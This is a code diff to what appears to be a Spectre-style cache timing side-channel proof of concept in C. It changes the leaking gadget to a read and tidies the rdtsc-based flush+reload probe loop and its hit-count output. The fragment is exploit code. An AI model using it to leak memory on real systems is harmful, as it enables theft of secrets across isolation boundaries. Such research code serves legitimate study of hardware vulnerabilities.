@@ -28,8 +28,12 @@ int
 user_gadget(int value)
 {
   //printf("value: %d\n", value);
+  // writes may not fetch line into cache?
+  /*
   channel[value * GAP] = 5;
   return 5;
+  */
+  return channel[value * GAP];
 }
 
 __attribute__((noinline))
@@ -220,12 +224,10 @@ main(int argc, char *argv[])
     for (i = 0; i < 256; i++) {
       mix_i = ((i * 167) + 13) & 255;
       addr = &channel[mix_i * GAP];
-      //start = start_timer();
       start = rdtsc();
       junk ^= *addr;
       mfence(); // make sure read completes before we check the timer
       elapsed = rdtsc() - start;
-      // elapsed = end_timer() - start;
       if (elapsed <= CACHE_HIT_THRESHOLD)
         hits[mix_i]++;
     }
@@ -234,7 +236,8 @@ main(int argc, char *argv[])
   // locate top two results
   j = k = -1;
   for (i = 0; i < 256; i++) {
-    printf("i: %d, hits: %d\n", i, hits[i]);
+    if (hits[i] > 0)
+      printf("i: %d, hits: %d\n", i, hits[i]);
 
     if (j < 0 || hits[i] >= hits[j]) {
       k = j;
